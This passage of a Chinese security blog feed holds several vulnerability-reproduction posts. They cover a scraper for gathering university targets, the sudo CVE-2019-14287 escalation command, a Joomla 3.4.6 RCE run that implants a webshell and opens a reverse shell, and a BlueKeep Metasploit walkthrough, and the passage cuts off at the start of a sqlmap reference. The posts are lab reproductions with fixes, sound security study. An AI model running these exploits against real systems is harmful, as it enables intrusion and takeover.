class="line">http://www.hao123.com/eduhtm/ah02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/ah03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/ah04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/fujian.htm</span><br><span class="line">http://www.hao123.com/eduhtm/fj02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/fj03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/fj04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/jianxi.htm</span><br><span class="line">http://www.hao123.com/eduhtm/jx02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/jx03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/jx04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/xizang.htm</span><br><span class="line">http://www.hao123.com/eduhtm/xz02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/henan.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hn02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hn03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hn04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/eduwh.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hubei02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hubei03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hubei04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hunan.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hunan02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hunan03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hunan04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/edugz.htm</span><br><span class="line">http://www.hao123.com/eduhtm/guangdong02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/guangdong03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/guangdong04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/xinjang.htm</span><br><span class="line">http://www.hao123.com/eduhtm/xinjiang02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/xinjiang03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/xinjiang04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/educq.htm</span><br><span class="line">http://www.hao123.com/eduhtm/chongqing02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/chongqing03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/chongqing04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/educd.htm</span><br><span class="line">http://www.hao123.com/eduhtm/sichuan02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/sichuan03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/sichuan04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/shangdong.htm</span><br><span class="line">http://www.hao123.com/eduhtm/shandong02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/shandong03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/shandong04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/yunnan.htm</span><br><span class="line">http://www.hao123.com/eduhtm/yunnan02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/yunnan03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/yunnan04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/eduhab.htm</span><br><span class="line">http://www.hao123.com/eduhtm/heilongjiang02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/heilongjiang03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/heilongjiang04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/edunanjin.htm</span><br><span class="line">http://www.hao123.com/eduhtm/jiangsu02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/jiangsu03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/jiangsu04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/eduxia.htm</span><br><span class="line">http://www.hao123.com/eduhtm/shanxi02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/shanxi03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/shanxi04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/gz.htm</span><br><span class="line">http://www.hao123.com/eduhtm/guizhou02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/guizhou03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/guizhou04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/qingdao.htm</span><br><span class="line">http://www.hao123.com/eduhtm/qinghai02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/qinghai03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/qinghai04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/nixai.htm</span><br><span class="line">http://www.hao123.com/eduhtm/ningxia02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/ningxia03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/ningxia04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hainan.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hainan02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hainan04.htm</span><br></pre></td></tr></table></figure><h2 id="爬取以上中的具体院校信息"><a href="#爬取以上中的具体院校信息" class="headerlink" title="爬取以上中的具体院校信息"></a>爬取以上中的具体院校信息</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"1.txt"</span>,<span class="string">'rt'</span>):</span><br><span class="line">        res = urllib.request.urlopen(line)</span><br><span class="line">        html = res.read().decode(<span class="string">'gb2312'</span>)</span><br><span class="line">        rule = re.findall(<span class="string">r"&lt;p&gt; 　　 &lt;a.*?href=.*?&lt;\/a&gt;&lt;/p&gt;&lt;/td&gt;"</span>, html, re.I|re.S|re.M)</span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> rule:</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">'edu-urls.txt'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        print(value.strip(<span class="string">'&lt;p&gt; 　　 '</span>),file=f)</span><br><span class="line">print(<span class="string">"it's ok"</span>)</span><br><span class="line">~</span><br></pre></td></tr></table></figure><p>得到最后的院校信息edu-urls.txt，一共2865条信息。</p><h2 id="整理结果"><a href="#整理结果" class="headerlink" title="整理结果"></a>整理结果</h2><p><a href="https://github.com/login546/login546.github.io/blob/hexo/source/_posts/download/edu-urls.txt" target="_blank" rel="noopener">Download</a></p><p>以上结果中存在百度百科的链接，没有去过滤，如需要请自行过滤。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在挖教育src时，发现手动找高校链接太慢，于是网上搜了下在&lt;a href=&quot;http://www.hao123.com/edu&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.hao123.com/edu&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;发现了收
      
    
    </summary>
    
      <category term="python" scheme="https:///login546.github.io/categories/python/"/>
    
    
      <category term="爬虫" scheme="https:///login546.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-14287之sudo提权复现</title>
    <link href="https:///login546.github.io/2019/10/16/CVE-2019-14287%E4%B9%8Bsudo%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/"/>
    <id>https:///login546.github.io/2019/10/16/CVE-2019-14287之sudo提权复现/</id>
    <published>2019-10-16T22:05:39.000Z</published>
    <updated>2021-01-22T08:48:08.990Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2019-14287漏洞复现"><a href="#CVE-2019-14287漏洞复现" class="headerlink" title="CVE-2019-14287漏洞复现"></a>CVE-2019-14287漏洞复现</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>漏洞前两天就爆出了，迫于手头有渗透测试任务没来的及复现，今天晚上跑步回来一试。。。</p><h3 id="复现动画"><a href="#复现动画" class="headerlink" title="复现动画"></a>复现动画</h3><p><a href="https://asciinema.org/a/PlH487cVnZ865mmWPvvyOpL2A" target="_blank" rel="noopener"><img src="https://asciinema.org/a/PlH487cVnZ865mmWPvvyOpL2A.svg" alt="asciicast"></a></p><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><blockquote><p>macOS Catalina 10.15</p></blockquote><h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><blockquote><p>切换至root用户，为/etc/sudoers添加    test    ALL = (ALL,!root) ALL</p><p>切换至test用户，执行sudo -u#-1 whoami </p><p>终端输出 root   或  4294967295（root的id）</p></blockquote><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>sudo版本&lt;1.8.28</p><p>此漏洞的利用需要使用户具有sudo的权限</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ol><li>升级至最新版本sudo</li><li>修改配置</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CVE-2019-14287漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2019-14287漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-14287漏洞复现&quot;&gt;&lt;/a&gt;CVE-2019-14287漏洞复现&lt;/h2&gt;&lt;h3 id=&quot;前
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https:///login546.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE-2019-14287" scheme="https:///login546.github.io/tags/CVE-2019-14287/"/>
    
  </entry>
  
  <entry>
    <title>Joomla3.4.6-RCE漏洞复现分析</title>
    <link href="https:///login546.github.io/2019/10/10/Joomla3-4-6-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https:///login546.github.io/2019/10/10/Joomla3-4-6-RCE漏洞复现分析/</id>
    <published>2019-10-10T09:59:37.000Z</published>
    <updated>2021-01-22T08:48:08.990Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Joomla-3-0-0-3-4-6-RCE-漏洞复现分析"><a href="#Joomla-3-0-0-3-4-6-RCE-漏洞复现分析" class="headerlink" title="Joomla 3.0.0-3.4.6 RCE 漏洞复现分析"></a>Joomla 3.0.0-3.4.6 RCE 漏洞复现分析</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>昨天就看到了许多安全媒体发布了Joomla RCE 漏洞的预警，一直到今天早上才有时间进行简单的复现和分析。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>主要是由于Joomla对于Session处理不当，可伪造Session，进行反序列化攻击。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>Joomla 3.4.6 <a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">下载地址</a></p><p>Joomla-3.4.6-RCE.py <a href="https://github.com/momika233/Joomla-3.4.6-RCE/blob/master/Joomla-3.4.6-RCE.py" target="_blank" rel="noopener">下载地址</a></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p><a href="https://asciinema.org/a/4lYL7w2oobX7diyORy09J0uqk" target="_blank" rel="noopener"><img src="https://asciinema.org/a/4lYL7w2oobX7diyORy09J0uqk.svg" alt="asciicast"></a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#验证漏洞是否存在，如果存在则输出Vulnerable</span></span></span><br><span class="line"><span class="meta">[shym]%</span><span class="bash"> python3 joomla-3.4.6-RCE.py -t http://192.168.2.164/</span></span><br><span class="line">[*] Getting Session Cookie ..</span><br><span class="line">[*] Getting CSRF Token ..</span><br><span class="line">[*] Sending request ..</span><br><span class="line">[+] Vulnerable</span><br><span class="line">[*] Use --exploit to exploit it</span><br><span class="line">[ShymdeMBP:joomla3.0.0-3.4.6]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#利用exp进行攻击：--explpit  监听主机地址：--lhost  监听主机端口：--lport </span></span></span><br><span class="line"><span class="meta">[shym]%</span><span class="bash"> python3 joomla-3.4.6-RCE.py -t http://192.168.2.164/ --exploit --lhost 192.168.2.173 --lport 9001</span></span><br><span class="line">[*] Getting Session Cookie ..</span><br><span class="line">[*] Getting CSRF Token ..</span><br><span class="line">[*] Sending request ..</span><br><span class="line">[+] Vulnerable</span><br><span class="line">[*] Getting Session Cookie ..</span><br><span class="line">[*] Getting CSRF Token ..</span><br><span class="line">[*] Sending request ..</span><br><span class="line">[+] Backdoor implanted, eval your code at http://192.168.2.164//configuration.php ##成功挂马的地址</span><br><span class="line">in a POST with </span><br><span class="line">jnyitzoezgaovqplmmjhjmjrvydzmiocrpxzpumwsihhhvozha ##随机生成的密码</span><br><span class="line">[*] Now it's time to reverse, trying with a system + perl</span><br></pre></td></tr></table></figure><p>成功利用后，会在/configuration.php插入一句话木马，如下图</p><p><img src="https://user-images.githubusercontent.com/38073810/66534820-0f669880-eb4a-11e9-8648-538849f5f646.png" alt="image"></p><p>蚁剑成功连接</p><p><img src="https://user-images.githubusercontent.com/38073810/66534624-61f38500-eb49-11e9-95e7-ca6275582ae7.png" alt="image"></p><h3 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h3><h4 id="Session处理问题"><a href="#Session处理问题" class="headerlink" title="Session处理问题"></a>Session处理问题</h4><p>Joomla改变了原本php对session的处理规则，导致在登录过程中，先执行write函数，再执行read函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># libraries/joomla/session/storage/database.php</span></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Write session data to the SessionHandler backend.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string  $id    The session identifier.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string  $data  The session data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  boolean  True on success, false otherwise.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   11.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($id, $data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Get the database connection object and verify its connected.</span></span><br><span class="line">$db = JFactory::getDbo();</span><br><span class="line"></span><br><span class="line">$data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">$query = $db-&gt;getQuery(<span class="keyword">true</span>)</span><br><span class="line">-&gt;update($db-&gt;quoteName(<span class="string">'#__session'</span>))</span><br><span class="line">-&gt;set($db-&gt;quoteName(<span class="string">'data'</span>) . <span class="string">' = '</span> . $db-&gt;quote($data))</span><br><span class="line">-&gt;set($db-&gt;quoteName(<span class="string">'time'</span>) . <span class="string">' = '</span> . $db-&gt;quote((int) time()))</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'session_id'</span>) . <span class="string">' = '</span> . $db-&gt;quote($id));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try to update the session data in the database table.</span></span><br><span class="line">$db-&gt;setQuery($query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$db-&gt;execute())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Since $db-&gt;execute did not throw an exception, so the query was successful.</span></span><br><span class="line"><span class="comment">Either the data changed, or the data was identical.</span></span><br><span class="line"><span class="comment">In either case we are done.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Read the data for a particular session identifier from the SessionHandler backend.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string  $id  The session identifier.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  string  The session data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   11.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Get the database connection object and verify its connected.</span></span><br><span class="line">$db = JFactory::getDbo();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Get the session data from the database table.</span></span><br><span class="line">$query = $db-&gt;getQuery(<span class="keyword">true</span>)</span><br><span class="line">-&gt;select($db-&gt;quoteName(<span class="string">'data'</span>))</span><br><span class="line">-&gt;from($db-&gt;quoteName(<span class="string">'#__session'</span>))</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'session_id'</span>) . <span class="string">' = '</span> . $db-&gt;quote($id));</span><br><span class="line"></span><br><span class="line">$db-&gt;setQuery($query);</span><br><span class="line"></span><br><span class="line">$result = (string) $db-&gt;loadResult();</span><br><span class="line"></span><br><span class="line">$result = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 在上面write17行中，由于mysql无法处理null字节，所以在写入时将 <code>chr(0) . &#39;*&#39; . chr(0)</code>替换为<code>\0\0\0</code>，然而protected修饰的字段在序列化后含有<code>\x00\x2a\x00</code>，读取时，将字符替换还原，防止无法正常反序列化。如果写入数据库的时候，是<code>\0\0\0</code>， 取出来的时候将会变成<code>chr(0) . &#39;*&#39; . chr(0)</code>，入库时候生成的序列化数据长度为6<code>\0\0\0</code>，造成溢出，那么取出来的时候将会成为3<code>N*N</code>，反序列化时，如按照原先的长度读取，后续的字符将被吃掉。所以可以利用<code>\0\0\0</code>溢出，来逃逸密码。然后构造有效对象，发送exp，触发exp既可。……</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1、更新至最新版本</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Joomla-3-0-0-3-4-6-RCE-漏洞复现分析&quot;&gt;&lt;a href=&quot;#Joomla-3-0-0-3-4-6-RCE-漏洞复现分析&quot; class=&quot;headerlink&quot; title=&quot;Joomla 3.0.0-3.4.6 RCE 漏洞复现分析&quot;&gt;&lt;/a
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https:///login546.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Joomla3.0.0-3.4.5 RCE" scheme="https:///login546.github.io/tags/Joomla3-0-0-3-4-5-RCE/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708漏洞复现</title>
    <link href="https:///login546.github.io/2019/09/07/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https:///login546.github.io/2019/09/07/CVE-2019-0708漏洞复现/</id>
    <published>2019-09-07T10:30:29.000Z</published>
    <updated>2021-01-22T08:48:08.990Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2019-0708漏洞复现"><a href="#CVE-2019-0708漏洞复现" class="headerlink" title="CVE-2019-0708漏洞复现"></a>CVE-2019-0708漏洞复现</h2><p><a href="https://asciinema.org/a/266469" target="_blank" rel="noopener"><img src="https://asciinema.org/a/266469.svg" alt="asciicast"></a></p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">Windows7 sp1 下载链接</a></li><li><a href="https://github.com/rapid7/metasploit-framework/pull/12283/files?file-filters%5B%5D=.rb" target="_blank" rel="noopener">exploit地址</a></li></ul><h3 id="配置exp"><a href="#配置exp" class="headerlink" title="配置exp"></a>配置exp</h3><p>攻击套件放到msf对应位置，如存在，请覆盖。如下对应地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb -&gt; /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">rdp_scanner.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep_rce.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">进入程序：msfconsole</span><br><span class="line">重载：reload_all</span><br><span class="line">启用0708攻击模块：use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">查看配置：info</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/64468945-035b7580-d15d-11e9-9b1a-ea7f3175bb23.png" alt="image"></p><p><img src="https://user-images.githubusercontent.com/38073810/64468951-1e2dea00-d15d-11e9-9fe9-3a6a1821f506.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">设置RHOSTS、RPOTRT、target</span><br><span class="line">target有0-4，设置成自己对应的</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set RHOSTS 10.211.55.3</span><br><span class="line">RHOSTS =&gt; 10.211.55.3</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set RPORT 3389</span><br><span class="line">RPORT =&gt; 3389</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 1</span><br><span class="line">target =&gt; 1</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/64468982-9c8a8c00-d15d-11e9-85f2-80dbea2ea779.png" alt="image"></p><p><img src="https://user-images.githubusercontent.com/38073810/64469059-892bf080-d15e-11e9-95f2-4eaeb38a007a.png" alt="image"></p><h3 id="漏洞修复补丁"><a href="#漏洞修复补丁" class="headerlink" title="漏洞修复补丁"></a>漏洞修复补丁</h3><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">Download</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CVE-2019-0708漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2019-0708漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-0708漏洞复现&quot;&gt;&lt;/a&gt;CVE-2019-0708漏洞复现&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;h
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https:///login546.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE-2019-0708" scheme="https:///login546.github.io/tags/CVE-2019-0708/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap参数详解</title>
    <link href="https:///login546.github.io/2019/08/07/sqlmap%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/"/>
    <id>https:///login546.github.io/2019/08/07/sqlmap参数详解/</id>
    <published>2019-08-07T09:50:41.000Z</published>
    <updated>2021-01-22T08:48:08.994Z</updated>
    
    <content type="html"><![CDATA[<p>sqlmap参数经常忘，所以就收集了大佬整理的一份参数详解。方便使用和查询。</p><h2 id="Options（选项）"><a href="#Options（选项）" class="headerlink" title="Options（选项）"></a>Options（选项）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Usage: python sqlmap.py [options]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Options（选项）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-h, <span class="comment">--help Show basic help message and exit</span></span><br><span class="line"><span class="comment">## 展示帮助文档 参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-hh <span class="keyword">Show</span> <span class="keyword">advanced</span> <span class="keyword">help</span> message <span class="keyword">and</span> <span class="keyword">exit</span></span><br><span class="line"><span class="comment">## 展示详细帮助文档参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--version Show program's version number and exit</span></span><br><span class="line"><span class="comment">## 显示程序的版本号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-v VERBOSE Verbosity <span class="keyword">level</span>: <span class="number">0</span><span class="number">-6</span> (<span class="keyword">default</span> 